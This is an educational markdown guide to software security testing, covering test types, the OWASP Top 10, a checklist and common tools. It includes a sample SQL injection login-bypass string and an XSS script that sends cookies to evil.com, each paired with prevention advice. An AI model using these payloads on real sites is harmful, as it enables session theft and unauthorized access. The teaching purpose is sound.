# Security Testing

## What Is Security Testing?

**Security Testing** is a type of non-functional testing that identifies **vulnerabilities, threats, risks, and weaknesses** in a software application to prevent unauthorized access, data breaches, and cyberattacks.

> *"The goal is to find vulnerabilities before hackers do."*

---

## Why Security Testing Is Critical

| Threat | Real Example | Cost |
|--------|-------------|------|
| Data breach | Yahoo (2016) — 3B accounts | $350M settlement |
| SQL Injection | Sony PlayStation Network | $171M + reputation |
| XSS Attack | British Airways (2018) | £20M fine (GDPR) |
| Credential stuffing | Netflix, Spotify account theft | Revenue + trust loss |

---

## Key Security Testing Types

### 1. 🔍 Vulnerability Assessment
Systematic review to identify known security weaknesses.
- Tools: Nessus, OpenVAS, Qualys

### 2. 🎯 Penetration Testing (Pen Test)
Simulated cyberattack to exploit vulnerabilities.
- **Black-box pentest:** Tester has no prior knowledge
- **White-box pentest:** Full system access given
- **Grey-box pentest:** Partial knowledge

### 3. 🔐 Authentication Testing
Testing login, session, and access control mechanisms.
- Brute force protection
- Password policies
- MFA/2FA verification

### 4. 💉 Injection Testing
Testing for SQL, LDAP, XML, command injection vulnerabilities.

### 5. 🔏 Cryptography Testing
Verifying data is properly encrypted in transit and at rest.
- HTTPS/TLS verification
- Password hashing (bcrypt, Argon2)

---

## OWASP Top 10 (2021)

The **Open Web Application Security Project** defines the top 10 most critical web vulnerabilities:

| Rank | Vulnerability | Description |
|------|--------------|-------------|
| A01 | Broken Access Control | Users can act beyond permissions |
| A02 | Cryptographic Failures | Weak/missing encryption |
| A03 | Injection | SQLi, XSS, command injection |
| A04 | Insecure Design | Missing security controls in design |
| A05 | Security Misconfiguration | Wrong permissions, default passwords |
| A06 | Vulnerable Components | Outdated libraries/frameworks |
| A07 | Auth & Session Failures | Weak authentication, session hijack |
| A08 | Data Integrity Failures | Unsigned data/code |
| A09 | Logging Failures | No audit trail for attacks |
| A10 | SSRF | Server-Side Request Forgery |

---

## Common Vulnerability Examples

### SQL Injection
```sql
-- Normal query
SELECT * FROM users WHERE email='user@test.com' AND password='pass123';

-- SQL Injection attack payload
Email: ' OR '1'='1'; --
-- Becomes:
SELECT * FROM users WHERE email='' OR '1'='1'; --' AND password='anything';
-- Returns ALL users → bypass login!
```

### XSS (Cross-Site Scripting)
```html
<!-- Attacker injects in a comment field -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

### How to Prevent:
- **SQLi:** Use parameterized queries / ORM
- **XSS:** Sanitize/escape all user inputs, Content-Security-Policy headers

---

## Security Testing Checklist

```
Authentication
  [ ] Brute force protection (lockout after N attempts)
  [ ] Password complexity enforced
  [ ] MFA available
  [ ] Secure session tokens (random, long)
  [ ] Session expires on logout

Authorization
  [ ] Role-based access control works
  [ ] Users can't access other users' data
  [ ] Admin functions protected from regular users

Data Protection
  [ ] Passwords hashed (bcrypt/Argon2) — NOT stored plain
  [ ] Sensitive data encrypted at rest
  [ ] HTTPS enforced (no HTTP fallback)
  [ ] Credit card data not stored

Input Validation
  [ ] All inputs sanitized
  [ ] SQL injection payloads rejected
  [ ] XSS payloads escaped
  [ ] File upload restricted to safe types

API Security
  [ ] API requires authentication
  [ ] Rate limiting in place
  [ ] CORS configured correctly
  [ ] Sensitive data not in URLs
```

---

## Security Testing Tools

| Tool | Purpose | Free? |
|------|---------|-------|
| **OWASP ZAP** | Web vulnerability scanner | ✅ Free |
| **Burp Suite** | Web security testing proxy | Freemium |
| **Nmap** | Network scanning | ✅ Free |
| **Metasploit** | Penetration testing framework | ✅ Free |
| **SQLMap** | Automated SQL injection | ✅ Free |
| **Nessus** | Vulnerability assessment | Paid |

---

## 📌 Key Takeaways

- Security is **everyone's responsibility** — not just the security team
- OWASP Top 10 is the **industry standard** reference for web vulnerabilities
- **Shift security left** — include security reviews from requirements phase
- Never store passwords in **plain text**
- Always test for **OWASP Top 10** at minimum

---

*Related: [OWASP Top 10 Deep Dive](../../11_Security_Testing/02_owasp_top_10_explained.md)*
